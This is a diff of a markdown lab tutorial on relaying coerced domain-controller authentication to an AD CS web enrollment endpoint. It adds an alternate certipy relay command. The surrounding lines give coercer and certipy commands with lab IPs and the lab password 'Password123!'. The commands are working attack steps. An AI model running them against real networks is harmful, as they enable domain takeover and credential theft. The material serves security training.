@@ -35,7 +35,9 @@ curl http://172.16.117.3/certsrv/certfnsh.asp
 2. In another console or shell, we use some available tools to coerce authentication against our target domain. We will use `coercer` with the option `coerce`. The arguments `-l` to specify the machine where we will be listening, we specify the target `-t 172.16.19.3` (the domain controller) and finally we pass the user and password with the options `-u` and `-p`, respectively. When `coercer` asks us for `Continue (C) | Skip this function (S) | Stop exploitation (X) ?` press `c` to continue with the attack and then `x` to stop exploitation.
 
 ```shell
-sudo certipy relay -target 172.16.19.5 -template DomainController
+sudo certipy relay -target 172.16.19.5 -template DomainController # or 
+sudo certipy relay -target http://172.16.19.5 -template DomainController
+
 coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
 # After getting the pfx file
 certipy auth -pfx lab-dc.pfx
